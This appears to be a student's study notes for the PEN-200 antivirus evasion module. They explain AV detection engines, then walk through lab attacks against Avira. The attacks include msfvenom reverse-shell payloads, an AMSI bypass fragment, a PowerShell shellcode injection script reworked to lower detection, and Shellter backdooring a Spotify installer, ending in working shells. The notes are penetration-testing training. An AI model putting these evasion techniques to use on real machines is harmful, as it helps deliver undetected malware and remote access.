@@ -1,0 +1,521 @@
+---
+title: PEN-200 Module 14 — Antivirus Evasion in 2023
+created: 2023-09-18 01:10:43Z
+updated: 2023-09-29 14:53:10Z
+---
+
+# PEN-200 Module 14 — Antivirus Evasion in 2023
+
+## TLDR;
+
+EV signatures change weekly, so the lab notebook emphasises process over recipes. Here’s the enriched workflow that survived testing.
+
+### Profile the Target Engine
+
+- Collect product/version (`Get-MpComputerStatus`, `wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct`).
+- Identify telemetry: does it ship logs to Defender for Endpoint, Carbon Black, CrowdStrike? Note event IDs and storage paths.
+- Understand scanning modes (on-access, scheduled, cloud lookups) and file reputation rules.
+
+### On-Disk Obfuscation
+
+1. Generate baseline payload: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=... -f raw`.
+2. Repackage with custom loaders:
+   - `Donut` ➜ shellcode wrapper.
+   - `ScareCrow` ➜ AMSI-aware loader with randomised imports.
+   - `pezor` ➜ PE packer with API hashing.
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.1 LPORT=4443 -f raw > payload.bin
+./donut -f payload.bin -o payload.js
+./scarecrow -i payload.bin -domain corp.local -out beacon.exe
+```
+
+3. Modify PE metadata (timestamps, section names) using `pefile` or `sigcheck -q -m` to verify changes.
+4. Sign payloads with client-provided certs when available; log thumbprints.
+
+### In-Memory & LOLBAS Techniques
+
+- Use `VirtualAlloc` ➜ `RtlMoveMemory` ➜ `CreateThread` flow for reflective loaders; keep the loader <3 KB to dodge heuristics.
+- Leverage AMSI bypasses responsibly (`[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils")`…); rotate strings and obfuscation each run.
+- Abuse LOLBAS binaries (`installutil.exe`, `msbuild.exe`, `rundll32.exe`) to execute payloads without touching disk.
+
+```
+powershell -nop -w hidden -c "[System.Reflection.Assembly]::Load([Convert]::FromBase64String('<base64 loader>')); Invoke-EntryPoint"
+```
+
+### Testing Matrix
+
+- Validate in isolated VMs for each AV product; capture detection verdicts (blocked, quarantined, allowed) and log them.
+- Record hash values (MD5/SHA256), VT hits, and behavioural detections for the report.
+- Keep a spreadsheet of loader versions, obfuscation options, and success rates.
+
+### Defensive Recommendations
+
+- Encourage clients to enable cloud-delivered protection, script block logging, and AMSI integrations.
+- Suggest application control (AppLocker/WDAC), PowerShell Constrained Language Mode, and EDR monitoring for LOLBAS anomalies.
+- Share IOC samples (filenames, hashes, mutexes, network indicators) generated during testing.
+
+AV evasion is an engineering treadmill. Capture every knob you turn, test across engines, and pair offensive success with actionable defensive guidance.
+
+## Working Notes... In Graphic Detail...
+
+### Antivirus Evasion
+
+- Antivirus Software Key Components and Operations.
+- Bypassing Antivirus Detections.
+- Antivirus Evasion in Practice.
+
+#### 14.1 Antivirus Software Key Components and Operations
+- 
+- Recognize known vs unknown threats.
+- Understand AV key components.
+- Understand AV detection engines.
+
+##### Known vs Unknown Threats
+
+Originally AV was based on signatures.  Signature languages are unique to each AV engine.  The signature languages vary, on one engine the signature may analyze the malware's signature on disk where another may analyze it's network traffic.
+
+In 2014 a sig language called YARA was open-sourced, allowing researchers to query the VirusTotal platform, even integrating their own signatures into AV products.
+- VirusTotal is an AV search engine.
+ - Search known malware.
+ - Submit samples and test against known.
+
+Signatures are written based on known threats, initially AV could only detect malware that had already been documented.  Modern AV, including Win Defender, integrate a Machine Learning engine that is called whenever an unknown file is discovered on the system.  ML Engines, operate in the cloud, and require an internet connection, which is often not an option on internal enterprise servers.  AV engines should not borrow too much resource from the system.
+
+To overcome the limits, Endpoint Detection and Response (EDR) have been evolving.  The EDR generates security event telemetry and forwards it to the SIEM.  The SIEM is monitored by teams of analysts, giving them a full overview of the org, any past or ongoing attack.
+
+AV and EDR are not mutually exclusive, they compliment each other.  Their deployment is based on internal network arch.
+
+
+##### AV Engines and Components
+
+Modern AV relies on signature updates, retrieved from the vendor's DB, over the internet.  The signatures are stored in a local sig DB, where they are utilized by the engine components;
+- File Engine.
+ - Responsible for scheduled and real-time file scans.
+  - Scheduled scan.
+   - Parses the entire file system, sending each files metadata to the sig engine.
+  - Real-time.
+   - Detecting and possibly reacting to any new file action, i.e. downloading malware from a website.
+   - IDs events a the kernel level via special mini-filter driver.
+    - This is why modern AV operates in Kernel and User land to validate the entire OS scope.
+- Memory Engine.
+ - Inspects each processes mem space at runtime for well-known binary sigs and suspicious API call that may result in mem injection attacks.
+- Network Engine.
+ - Inspects incoming and outgoing network traffic on the local net iface.
+ - When a sig is matched, the net eng may attempt to block malware from comm with it's C2 server.
+- Disassembler.
+ - Translates machine code into asm.
+ - Reconstructing the original code section.
+ - IDs encode/decode routines.
+- Emulator/Sandbox.
+ - Isolate and load malware for analysis.
+  - Once loaded and running in the emulated sandbox it is thoroughly analyzed against known sigs.
+- Browser Plugin.
+ - Browsers are protected by a sandbox, modern AV uses browser plugins to get visibility and detect mal content exec in browser.
+- Machine Learning Engine.
+ - Vital part of modern AV, enables the detection of unknown threats by relying on cloud enhanced computing resources.
+
+These engines work in concert with the sig DB to rank events as benign, malicious, or unknown.
+
+##### Detection Methods
+
+AV sig syntax and scope differs based on the engine they are built for, but serve the same purpose.  Detection methodologies;
+- Signature-based Detection.
+ - Restricted list technology.
+ - Scans for known sigs.
+ - Sigs can be a file hash, set of patterns, specific binary vals and strings belonging to each specific malware.
+ - Weak method, changing a single bit results in a completely diff hash.
+- [Heuristic-based Detection](https://en.wikipedia.org/wiki/Heuristic_analysis)
+ - Relies on rules and algorithms to make determination.
+ - Steps through instruction set of binary file or decompile/analyze the source code to map the program.
+- [Behavioral Detection](https://pdfs.semanticscholar.org/08ec/24106e9218c3a65bc3e16dd88dea2693e933.pdf)
+ - Dynamically analyzes the the behavior of a binary file .
+ - Achieved by exec in sandbox and searching for behavior considered malicious.
+- [Machine Learning Detection](https://i.blackhat.com/us-18/Thu-August-9/us-18-Parikh-Protecting-the-Protector-Hardening-Machine-Learning-Defenses-Against-Adversarial-Attacks.pdf)
+ - Uses ML algorithms to detect unknown threats.
+ - Collects and analyzes metadata.
+ - Example; Win Defender has 2 ML components.
+  - Client ML engine.
+   - Creates ML models and heuristics.
+  - Cloud ML engine.
+   - Analyze submitted samples against cloud DB of metadata based models of other submitted samples.
+   - When client ML is unable to determine benign or not, it passes it to the cloud ML for final response.
+   - Doesn't require sigs and can detect unknown threats.
+   - Methods differ by AV vendor and results differ as well.
+
+To demonstrate this, we will scan a Metasploit payload.  Using Msfvenom we will generate a standard Win PE containing our payload, a simple TCP rev shell.
+*The PE file format is used on Windows operating systems for executable and object files. The PE format represents a Windows data structure that details the information necessary for the Windows Loader7 to manage the wrapped executable code including required dynamic libraries, API import and export tables, etc.*
+
+Before generating a payload, make sure Kali and MSF are up to date.  MSF is updated frequently and AV sigs change as well.  The intrinsic delay in AV sign updates may give a fresh version of MSF an edge against stale AV sigs during a pentest.
+
+- Generate the payload.
+	- `msfvenom`
+ - `-p` to specify the payload.
+ - `LHOST` rev shell local host.
+ - `LPORT` rev shell local port.
+ - `-f` specifying `EXE` file format.
+	- `>` output a file names `binary.exe`
+```bash
+┌──(operator㉿labhost)-[~/OffSec/fixing-exploits]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.239 LPORT=4444 -f exe > binary.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+```
+- Scan the exe using VirusTotal.
+ - *VirusTotal is convenient, but it generates a hash along with storing the original file for each unique submission. The submitted files along with the metadata are then shared with all participating AV vendors. As such, take care when submitting sensitive payloads as the hash is considered public from the time of first submission.*.
+![d2c73438e913b954933365e758704e5f.png](../_resources/d2c73438e913b954933365e758704e5f.png)
+ - Many AV products flag the file as malicious based on various methods descibed here.
+
+#### 14.1 Bypassing Antivirus Detections
+ 
+- Understand on-disk evasion techniques.
+- Understand in-memory evasion techniques.
+
+##### On-Disk Evasion
+
+- Modern malware obfuscation takes many forms.
+- One of the earliest methods is the use of [packers](https://en.wikipedia.org/wiki/Executable_compression)
+ - Designed to reduce size of executable.
+ - Generate an exe that is smaller, functionally equivalent, with a new binary structure.
+ - Has a new hash sig and can bypass older AV methods based on file sig.
+ - Modern malware uses variations, [UPX](https://upx.github.io/) and other packers alone are not enough to evade modern AV.
+- Obfuscators.
+ - Mutate code making it harder to reverse-engineer.
+ - Replaces instructions with semantic equiv.
+ - Insert [dead code](https://en.wikipedia.org/wiki/Dead_code)
+ - Split/reorder funcs.
+ - Primarily used by software developers to protect their IP.
+ - Marginally effective against sig based AV methods.
+ - Modern obfuscators have runtime in-mem capabilities, hinder AV detection further.
+- Crypter.
+ - Cryptographically alters exe.
+ - Adds decrypt stub that restore OG code on exec.
+ - Decrypt happends in mem, leaving encrypted code on disk.
+ - Foundational in modern malware as one of the most effective evasion techniques.
+
+Effective evasion requires a combination of techniques and more advanced methods;
+- Anti-reversing.
+- Anti-debugging.
+- VM emulation detection.
+- Software protectors.
+ - Designed for legit purposes, but can be used to bypass AV.
+
+There are several actively-maintained free tools that provide adequate AV evasion.  Commercial tools, such as [The Enigma Protector](http://www.enigmaprotector.com/en/home.html), can bypass many AV products.
+
+##### In-Memory Evasion
+
+- [In-Memory Injections](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
+ - Aka PE Injection.
+ - Popular technique for bypassing AV on Win.
+ - Focuses on manipulation of volatile mem.
+ - Does not write to disk.
+  - Common focus of most AV solutions.
+- [Several evasion techniques](https://blog.f-secure.com/memory-injection-like-a-boss/) do not write to disk.
+- Remote Process Memory Injection.
+ - Injects payload into a benign PE.
+ - Common method leverages [Win APIs](https://en.wikipedia.org/wiki/Windows_API)
+	- To achieve;
+		- [OpenProcess](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)
+   - Obtain valid [HANDLE](https://en.wikipedia.org/wiki/Handle_(computing)) of target process.
+		- Allocate mem in the context of that process by calling WIN API such as;
+			- [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
+  - Copy payload into alloc mem.
+			- [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
+  - Exec in mem.
+			- [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread)
+ - Though complex, Powershell can do the heavy lifting in most cases.
+- Reflective DLL Injection.
+ - Unlike regular DLL injection, where the DLL is loaded from disk using the LoadLibrary API, this method attempts to load a DLL stored by the attacker in process memory.
+  - Challenge being LoadLibrary does not support loading a DLL from memory.
+   - Win also does not expose and API that can handle this.
+  - Attacker must write their own version of the API that does not require disk based DLL loading.
+- Process Hollowing.
+ - FIrst launch a benign process in a suspended state.
+ - Once launched, the image of the proc is removed from mem and replaced with mal exec image.
+ - Finally, process is resumed and mal code is executed in place of legit proc.
+- Inline Hooking.
+ - Modify memory to introduce a hook (instruction redirecting code for exec)
+ - Upon redirection and exec of mal code the the flow returns back to the modified func appearing as only the legit code had executed.
+ - Often employed by rootkits.
+  - Stealthy malware, provide author with persistent dedicated access to the target system.
+  - Modifies system components in;
+   - User space.
+   - Kernel.
+   - Lower OS protection rings.
+    - Boot.
+    - Hypervisor.
+  - Need admin privs.
+   - Often installed from an elevated shell or by privesc.
+
+#### 14.3 AV Evasion in Practice
+
+- Understand antivirus evasion testing best practices.
+- Manually evade AV solutions.
+- Leverage automated tools for AV evasion.
+
+##### Testing for AV Evasion
+
+SecOps; joint collab between enterprise IT and SOC, goal is to provide continuous detection/protection against well-known and novel threats.  As a pentester you have to have an understanding of the implications dealing with SecOps teams.
+
+Example;
+- VirusTotal can give us an idea of how stealthy our malware is.
+- The platform sends all samples to AV vendors subscribed to their platform.
+ - Therefore shortly after submitting a sample, AV vendors can run the mal in their sandbox and ML engines to build detection sigs.
+ - Rendering the mal unusable.
+- [AntiScan.Me](https://antiscan.me/) scans against 30 diff AV engines and claims to not divulge samples to 3rd parties.
+ - This is a last resort when we don't know the target's AV vendor.
+- If we know the target's AV vendor.
+ - We should build a VM similar to the target env.
+
+Regardless of AV product we are testing, we should disable sample submission to prevent the same drawback as virus total.  In Win Defender;
+- Windows Security.
+- Virus & Thread Protection.
+- Manage Settings.
+ - Deselect automatic sample submission.
+ - Only enable it when we are confident in our bypass method and if the target has it enabled in their env.
+ - *Since both Windows Defender cloud protection and automatic sample submission require internet connectivity, we should first verify that this is reflected in our target environment: some company policies mandate limited internet access to some production servers and as a consequence, some advanced AV features are inhibited.*.
+
+As a rule of thumb, always prefer custom code when developing bypasses.  AV signatures are extrapolated from the malware sample, the more novel the code, the lower the likelihood of detection.
+
+
+##### Evading AV with Thread Injection
+
+Finding a universal solution to bypass all AV engine is difficult, time consuming, and possibly impossible.  It is far more effective to target the specific AV solution deployed by the target.
+
+In our examples, we will interact with *Avira Free Security version 1.1.68.29553* on a Win 11 client.  As a first step in working with AV, make sure the system is working as intended by testing it with the basic Msfvenom PE we created earlier.  
+
+Depending on how restricted the target env is, we may be able to bypass the AV product with PowerShell.  This example will utilize the **remote process memory injection** technique, similar to what we described previously, but we will target the currently executing process (x86 PowerShell interpreter).
+
+PowerShell can interact with the [Windows API](https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/), allowing us to implement in-memory injection using a PowerShell script.  It's harder for AV to determine if a script is malicious compared to a PE, the script itself is not exec code and runs in the interpreter.  AV solutions handle mal script detection with varying degrees of success.
+
+In the event the script is marked as mal, it can be easily altered.  AV will often review the variable names, comments, and logic which can be altered without the need to recompile.
+
+To demonstrate, we will analyze a well-known version of a memory injection PowerShell script and test it against it with Avira.  The basic template for memory injection;
+```
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+$winFunc = 
+  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;
+
+[Byte[]];
+[Byte[]]$sc = <place your shellcode here>;
+
+$size = 0x1000;
+
+if ($sc.Length -gt 0x1000) {$size = $sc.Length};
+
+$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};
+
+$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+```
+- The scripts starts with imports.
+ - VirtualAlloc.
+  - From  `kernel32.dll`
+  - Allocate memory.
+ - CreateThread.
+  - From  `kernel32.dll`
+  - Create an execution thread.
+ - Memset.
+  - From  `msvcrt.dll`
+  - Write data to allocated memory.
+- This is performed in the current process, powershell.exe.
+- The main logic.
+ - Allocates a block of mem.
+  - Takes each byte of `$sc` byte array, writes it to newly-allocated mem using `memset`
+ - It then executes in a separate thread.
+ - Uses the `CreateThread` API.
+- We have to add a payload and will use the same one as the PE for consistency.
+ - Generate with msfvenom.
+```bash
+kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
+...
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 699 bytes
+Final size of powershell file: 3454 bytes
+[Byte[]] $sc =  0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
+...
+```
+- Copy the output into the script.
+
+Next we validate the detection rate of the PS1 script.  AntiScan.me is the first choice, but does not support PS1, se we must use VirusTotal.
+![1e0e231418742146669ea4729a1b7a39.png](../_resources/1e0e231418742146669ea4729a1b7a39.png)
+- 29/59, not great!
+ - We need to circumvent some of the AV sig logic.
+- Scripts are just interpreted text files.
+ - Not as easily fingerprinted as binary files.
+ - Binary files have a more structured data format.
+- To catch mal scripts, AV vendors often rely on static string signatures.
+ - Variable names.
+ - Function names.
+- To bypass that logic, we can give our variables more generic names.
+```
+$var2 = Add-Type -memberDefinition $code -Name "iWin32" -namespace Win32Functions -passthru;
+
+[Byte[]];   
+[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
+...
+
+$size = 0x1000;
+
+if ($var1.Length -gt 0x1000) {$size = $var1.Length};
+
+$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
+
+$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+```
+- We have changed.
+	- `Win32` hard-coded class name for the `Add-Type` cmdlet to `iWin32`
+	- `$sc` to `$var1`
+	- `$winFunc` to `$var2`
+- Improved to 17/48 on VirusTotal.
+- Transferred to Win 11 client.
+ - Aviara Quick Scan.
+  - Undetected.
+  - *To get sense of the detection rate, we could have uploaded the modified bypass to VirusTotal as well. However, as we learned earlier, this could jeopardize our penetration test as our sample could be analyzed and detected by the more powerful cloud-based machine learning engines.*.
+
+- Next launch the x86 version of PowerShell.
+ - Run our bypass script.
+ - Analyze the output.
+- We receive an error referencing the Execution Policies of the system.
+ - Preventing the script from running.
+- Referring to MS docs on PowerShell Execution Policy we find that the policy is set on a per user basis, not per system.
+ - *Keep in mind that much like anything in Windows, the PowerShell Execution Policy settings can be dictated by one or more Active Directory GPOs. In those cases, it may be necessary to search for additional bypass vectors.*.
+- We can attempt to view and change the policy for our user.
+ - In this case we change the policy globally.
+  - It can be changed per script using the `ExecutionPolicy Bypass` flag when run.
+- First, retrieve the current execution policy with;
+	- `Get-ExecutionPolicy -Scope CurrentUser`
+- Then set it to *Unrestricted*;
+	- `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
+```powershell
+PS C:\Users\offsec\Desktop> .\meminj.ps1
+.\meminj.ps1 : File C:\Users\offsec\Desktop\meminj.ps1 cannot be loaded because running scripts is disabled on this
+system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:1
++ .\meminj.ps1
++ ~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
+Undefined
+PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help topic at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): Y
+PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser
+Unrestricted
+```
+- Now we start a local netcat listener and run our scipts.
+- The script executes and we receive a reverse shell.
+```bash
+┌──(operator㉿labhost)-[~/OffSec/av-evasion]
+└─$ nc -nvlp 443            
+listening on [any] 443 ...
+connect to [192.168.45.239] from (UNKNOWN) [192.168.219.62] 52269
+Microsoft Windows [Version 10.0.22000.675]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec>whoami
+whoami
+client01\offsec
+```
+- Thus, we have evaded Avira AV successfully.
+- Mature orgs implement various ML systems to analyze scripts run on systems.
+ - This may require adaptations.
+- With a skilled SOC, the EDR could alert team and render our attack useless in minutes.
+
+##### Automating the Process
+
+- [Shellter](https://www.shellterproject.com/)
+ - Dynamic shellcode injection tool.
+ - One of the most popular free tools capable of AV evasion.
+ - Uses novel and advanced techniques to to backdoor non-mal exec files with mal payloads.
+ - At a high level;
+  - Analyzes PE file and exec paths.
+  - Determines where it can inject shellcode .
+  - Using advanced techniques that can not be easily detected by AV.
+  - These include changing PE file section perms, creating new sections, etc.
+- Shellter attempts to use existing PE [Import Address Table (IAT)](https://en.wikipedia.org/wiki/Portable_Executable#Import_Table)
+ - Located functions used for;
+  - Memory allocation.
+  - Transfer.
+  - Exec of payload.
+ - *Shellter Pro (paid) supports 32/64 bit bins, including stealthier features*.
+- Example; attempt to use Shellter to bypass Avira AV.
+ - Install shelter `apt install shelter`
+ - Designed to run on win, install wine `apt install wine`
+ - Run `shellter`
+- Shellter can run in Auto or Manual mode.
+ - Manual.
+  - Tool launches the PE we want to use for injection.
+  - Allows manipulation on more granular level.
+  - Use this mode to customize the injection process (if auto opts fail)
+- For this example select Auto mode.
+ - Select `A` at prompt.
+ - Select target PE.
+  - *We will use the Win 32 trial exec installer for Spotify*.
+  - *In engagement, best to pick new, less scrutinized apps*.
+- Enter the path of the PE.
+ - Shellter backs up the PE first.
+ - When Shellter finds a place to inject shellcode it prompts if we want to use Stealth Mode.
+  - Attempts to restore the exec flow of the PE.
+  - Enable it on our installer.
+ - Next select payload.
+  - *Note: to restore exec flow in StealthMode, custom payloads need to terminate by exiting the current thread*.
+  - After testing, it seems non-Meterpreter payloads fail to exec under Win 11.
+   - Select Meterpreter reverse shell payload that Avira detected at the beginning of this module.
+   - Use `L` for listed payload.
+   - Opt `1` for `Meterpreter_Reverse_TCP`
+  - Set payload params.
+ - Shellter will then inject the payload and attempt to reach the first instruction.
+ - Configure out listener on attacking machine.
+		- One liner `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.195;set LPORT 443;run;"`
+ - Transfer the PE to target.
+  - Open Avira and perform quick scan.
+			- No threat detected!
+   - Since Shellter obfuscates the payload and decoder before injection, Avira does not detect it as mal.
+  - Exec the PE and we are presented with the default Spotify Installer.
+	- Return to our multi/handler and we receive a Meterpreter shell!
+```
+[*] Using configured payload generic/shell_reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+LHOST => 192.168.45.195
+LPORT => 443
+[*] Started reverse TCP handler on 192.168.45.195:443 
+[*] Sending stage (175686 bytes) to 192.168.215.62
+[*] Meterpreter session 1 opened (192.168.45.195:443 -> 192.168.215.62:51235) at 2023-09-29 06:53:57 -0700
+
+meterpreter > shell
+Process 3572 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.675]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec\Desktop>whoami
+whoami
+client01\offsec
+
+C:\Users\offsec\Desktop>
+```
+- We have successfully evaded AV with Shellter, bypassed Avira AV, and compromised our target!
+
